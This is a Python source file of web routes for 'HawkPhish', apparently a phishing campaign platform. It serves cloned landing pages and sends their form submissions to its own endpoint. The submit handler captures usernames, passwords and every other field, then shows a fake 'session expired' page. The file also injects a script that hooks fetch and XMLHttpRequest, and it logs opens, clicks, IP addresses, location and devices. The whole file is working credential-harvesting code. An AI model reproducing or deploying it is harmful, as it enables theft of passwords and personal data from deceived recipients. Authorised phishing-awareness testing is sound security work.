"""HawkPhish - Tracking, Sessions & Landing Page Routes (Multi-file support)"""
import os
import re
import mimetypes
from pathlib import Path
from fastapi import APIRouter, Depends, Request, Form, Query, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse, Response, FileResponse, PlainTextResponse
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, func, desc
from database import get_db
from models import EmailLog, LandingPage, CredentialSubmit, Campaign, RecipientSession, Recipient
from services.tracking_service import TrackingService
from pydantic import BaseModel
from typing import Optional

router = APIRouter(tags=["Tracking"])

# Base directory for landing page files (must match landing_pages.py)
LP_BASE_DIR = Path(os.path.dirname(__file__)).parent / "landing_pages"


def _lp_dir(page_id: int) -> Path:
    return LP_BASE_DIR / str(page_id)


def _inject_tracking(html: str, page_id: int, tracking_id: str) -> str:
    """Inject tracking_id into all forms and rewrite relative links to preserve it."""
    # Inject tracking_id into all forms
    def _form_replacer(match):
        form_tag = match.group(0)
        if 'name="tracking_id"' in form_tag:
            return form_tag
        # Rewrite action to our submit endpoint
        action_match = re.search(r'action=["\']([^"\']*)["\']', form_tag, re.IGNORECASE)
        action = action_match.group(1) if action_match else ""
        # If action is relative, empty, or not an external URL, set to our submit endpoint
        if not action or not action.startswith("http"):
            form_tag = re.sub(
                r'action=["\'][^"\']*["\']',
                f'action="/lp/{page_id}/submit"',
                form_tag,
                flags=re.IGNORECASE,
                count=1
            )
        return form_tag + f'<input type="hidden" name="tracking_id" value="{tracking_id}">'

    html = re.sub(r'<form\b[^>]*>', _form_replacer, html, flags=re.IGNORECASE)

    # Rewrite relative links to append tracking_id
    def _link_replacer(match):
        href = match.group(1)
        if href.startswith("http") or href.startswith("#") or href.startswith("javascript:") or href.startswith("mailto:"):
            return match.group(0)
        separator = "&" if "?" in href else "?"
        return f'href="{href}{separator}tracking_id={tracking_id}"'

    html = re.sub(r'href=["\']([^"\']*)["\']', _link_replacer, html)

    # Inject script for JS-based tracking preservation
    script = f"""<script>
    window.__hawkphish_tracking_id = '{tracking_id}';
    window.__hawkphish_page_id = {page_id};
    (function() {{
        var origFetch = window.fetch;
        window.fetch = function(url, opts) {{
            if (typeof url === 'string' && !url.includes('tracking_id')) {{
                var sep = url.includes('?') ? '&' : '?';
                url = url + sep + 'tracking_id=' + window.__hawkphish_tracking_id;
            }}
            return origFetch(url, opts);
        }};
        // Also intercept XMLHttpRequest
        var origOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {{
            if (typeof url === 'string' && !url.includes('tracking_id')) {{
                var sep = url.includes('?') ? '&' : '?';
                url = url + sep + 'tracking_id=' + window.__hawkphish_tracking_id;
            }}
            return origOpen.call(this, method, url);
        }};
    }})();
</script>"""
    if "</head>" in html:
        html = html.replace("</head>", script + "</head>", 1)
    elif "</body>" in html:
        html = html.replace("</body>", script + "</body>", 1)
    else:
        html = html + script

    return html


@router.get("/pixel/{tracking_id}")
async def tracking_pixel(tracking_id: str, request: Request, db: AsyncSession = Depends(get_db)):
    tracking = TrackingService(db)
    await tracking.record_open(
        tracking_id,
        user_agent=request.headers.get("user-agent", ""),
        ip_address=request.client.host if request.client else "",
        language=request.headers.get("accept-language", ""),
        referrer=request.headers.get("referer", ""),
    )
    return Response(content=tracking.get_pixel(), media_type="image/gif")


@router.get("/track/{tracking_id}")
async def tracking_redirect(tracking_id: str, request: Request, db: AsyncSession = Depends(get_db)):
    tracking = TrackingService(db)
    redirect_path = await tracking.record_click(
        tracking_id,
        user_agent=request.headers.get("user-agent", ""),
        ip_address=request.client.host if request.client else "",
        language=request.headers.get("accept-language", ""),
        referrer=request.headers.get("referer", ""),
    )
    return RedirectResponse(url=redirect_path)


@router.get("/lp/{landing_page_id}", response_class=HTMLResponse)
async def show_landing_page(landing_page_id: int, request: Request, tracking_id: str = "", db: AsyncSession = Depends(get_db)):
    page = await db.get(LandingPage, landing_page_id)
    if not page:
        return HTMLResponse("<h1>Page not found</h1>", status_code=404)

    # Check if this is a multi-file landing page
    lp_dir = _lp_dir(landing_page_id)
    root_file = page.root_file or "index.html"
    root_path = lp_dir / root_file

    if root_path.exists():
        html = root_path.read_text(encoding="utf-8")
    else:
        html = page.html_content or ""

    if not html:
        return HTMLResponse("<h1>Page not found</h1>", status_code=404)

    # Inject tracking_id into forms and links
    if tracking_id:
        html = _inject_tracking(html, landing_page_id, tracking_id)

    return HTMLResponse(html)


@router.get("/lp/{landing_page_id}/{path:path}")
async def serve_landing_page_file(
    landing_page_id: int,
    path: str,
    request: Request,
    tracking_id: str = "",
    db: AsyncSession = Depends(get_db),
):
    """Serve static files (CSS, JS, images) for multi-file landing pages."""
    page = await db.get(LandingPage, landing_page_id)
    if not page:
        raise HTTPException(404, "Landing page not found")

    lp_dir = _lp_dir(landing_page_id)
    file_path = lp_dir / path

    # Security: prevent path traversal
    try:
        file_path.relative_to(lp_dir)
    except ValueError:
        raise HTTPException(400, "Invalid path")

    if not file_path.exists() or not file_path.is_file():
        raise HTTPException(404, "File not found")

    # If it's an HTML file, inject tracking
    content_type, _ = mimetypes.guess_type(str(file_path))
    content_type = content_type or "application/octet-stream"

    if content_type == "text/html" or file_path.suffix.lower() in (".html", ".htm"):
        html = file_path.read_text(encoding="utf-8")
        if tracking_id:
            html = _inject_tracking(html, landing_page_id, tracking_id)
        return HTMLResponse(html)

    # For binary files (images, etc.)
    if content_type.startswith("text/") or content_type in ("application/javascript", "application/json"):
        return PlainTextResponse(file_path.read_text(encoding="utf-8"), media_type=content_type)
    else:
        return FileResponse(str(file_path), media_type=content_type)


@router.post("/lp/{landing_page_id}/submit")
async def submit_credentials(
    landing_page_id: int,
    request: Request,
    db: AsyncSession = Depends(get_db),
):
    """Capture credentials from landing page forms. Supports any form fields."""
    # Parse form data dynamically
    form = await request.form()
    tracking_id = form.get("tracking_id", "")
    email = form.get("email", "") or form.get("username", "") or form.get("user", "") or ""
    password = form.get("password", "") or form.get("pass", "") or form.get("pwd", "") or ""

    # Collect all extra fields as a dict
    extra_data = {}
    capture_fields = ["tracking_id", "email", "username", "user", "password", "pass", "pwd"]
    for key, value in form.multi_items():
        if key not in capture_fields and value:
            extra_data[key] = value

    tracking = TrackingService(db)
    await tracking.record_credential(
        tracking_id=tracking_id,
        email=email,
        password=password,
        data=extra_data,
        user_agent=request.headers.get("user-agent", ""),
        ip_address=request.client.host if request.client else "",
        language=request.headers.get("accept-language", ""),
        referrer=request.headers.get("referer", ""),
    )

    page = await db.get(LandingPage, landing_page_id)
    if page and page.redirect_url:
        return RedirectResponse(url=page.redirect_url, status_code=302)

    return HTMLResponse("""
        <html><body style="font-family:sans-serif;text-align:center;padding:50px">
        <h2>Thank you</h2><p>Your session has expired. Please sign in again.</p>
        </body></html>
    """)


@router.get("/api/sessions")
async def list_sessions(
    campaign_id: Optional[int] = Query(None),
    status: Optional[str] = Query(None),
    limit: int = Query(50, le=200),
    db: AsyncSession = Depends(get_db),
):
    query = select(RecipientSession).order_by(desc(RecipientSession.last_event_at))
    if campaign_id:
        query = query.where(RecipientSession.campaign_id == campaign_id)
    if status:
        query = query.where(RecipientSession.status == status)
    query = query.limit(limit)

    result = await db.execute(query)
    sessions = result.scalars().all()
    return [{
        "id": s.id,
        "campaign_id": s.campaign_id,
        "recipient_id": s.recipient_id,
        "email": s.email,
        "status": s.status,
        "total_events": s.total_events,
        "first_event_at": s.first_event_at.isoformat() if s.first_event_at else None,
        "last_event_at": s.last_event_at.isoformat() if s.last_event_at else None,
        "ip_addresses": s.ip_addresses or [],
        "browsers": s.browsers or [],
        "devices": s.devices or [],
        "countries": s.countries or [],
        "events": s.events or [],
    } for s in sessions]


@router.get("/api/sessions/{session_id}")
async def get_session(session_id: int, db: AsyncSession = Depends(get_db)):
    session = await db.get(RecipientSession, session_id)
    if not session:
        raise HTTPException(404, "Session not found")

    recipient = await db.get(Recipient, session.recipient_id) if session.recipient_id else None
    campaign = await db.get(Campaign, session.campaign_id) if session.campaign_id else None

    return {
        "id": session.id,
        "campaign_id": session.campaign_id,
        "campaign_name": campaign.name if campaign else "",
        "recipient_id": session.recipient_id,
        "email": session.email,
        "recipient_name": f"{recipient.first_name} {recipient.last_name or ''}".strip() if recipient else "",
        "status": session.status,
        "total_events": session.total_events,
        "first_event_at": session.first_event_at.isoformat() if session.first_event_at else None,
        "last_event_at": session.last_event_at.isoformat() if session.last_event_at else None,
        "ip_addresses": session.ip_addresses or [],
        "browsers": session.browsers or [],
        "devices": session.devices or [],
        "countries": session.countries or [],
        "events": session.events or [],
    }


@router.get("/api/live-feed")
async def live_feed(limit: int = Query(30, le=100), db: AsyncSession = Depends(get_db)):
    result = await db.execute(
        select(EmailLog)
        .where(EmailLog.status.in_(["opened", "clicked", "submitted"]))
        .order_by(desc(EmailLog.opened_at))
        .limit(limit)
    )
    logs = result.scalars().all()

    entries = []
    for log in logs:
        recipient = await db.get(Recipient, log.recipient_id) if log.recipient_id else None
        campaign = await db.get(Campaign, log.campaign_id) if log.campaign_id else None
        ts = log.submitted_at or log.clicked_at or log.opened_at
        entries.append({
            "tracking_id": log.tracking_id,
            "status": log.status,
            "email": recipient.email if recipient else "",
            "recipient_name": f"{recipient.first_name} {recipient.last_name or ''}".strip() if recipient else "",
            "campaign_name": campaign.name if campaign else "",
            "ip_address": log.ip_address or "",
            "browser": log.browser or "",
            "os": log.os or "",
            "device": log.device or "",
            "country": log.country or "",
            "city": log.city or "",
            "isp": log.isp or "",
            "time": ts.isoformat() if ts else "",
        })
    return entries


@router.get("/api/dashboard")
async def dashboard(db: AsyncSession = Depends(get_db)):
    from sqlalchemy import select as sel, func
    from models import SMTPConfig, Group, Recipient

    campaigns = await db.execute(sel(Campaign))
    campaigns_list = campaigns.scalars().all()

    total_sent = sum(c.total_sent for c in campaigns_list)
    total_opened = sum(c.total_opened for c in campaigns_list)
    total_clicked = sum(c.total_clicked for c in campaigns_list)
    total_submitted = sum(c.total_submitted for c in campaigns_list)

    smtp_count = await db.execute(sel(func.count(SMTPConfig.id)))
    group_count = await db.execute(sel(func.count(Group.id)))
    recipient_count = await db.execute(sel(func.count(Recipient.id)))

    sessions_result = await db.execute(sel(func.count(RecipientSession.id)))
    total_sessions = sessions_result.scalar() or 0

    return {
        "campaigns": {
            "total": len(campaigns_list),
            "running": sum(1 for c in campaigns_list if c.status == "running"),
            "completed": sum(1 for c in campaigns_list if c.status == "completed"),
        },
        "stats": {
            "total_sent": total_sent,
            "total_opened": total_opened,
            "total_clicked": total_clicked,
            "total_submitted": total_submitted,
            "total_sessions": total_sessions,
            "open_rate": round((total_opened / total_sent * 100) if total_sent > 0 else 0, 1),
            "click_rate": round((total_clicked / total_sent * 100) if total_sent > 0 else 0, 1),
            "submit_rate": round((total_submitted / total_sent * 100) if total_sent > 0 else 0, 1),
        },
        "resources": {
            "smtp_configs": smtp_count.scalar() or 0,
            "groups": group_count.scalar() or 0,
            "recipients": recipient_count.scalar() or 0,
        },
    }
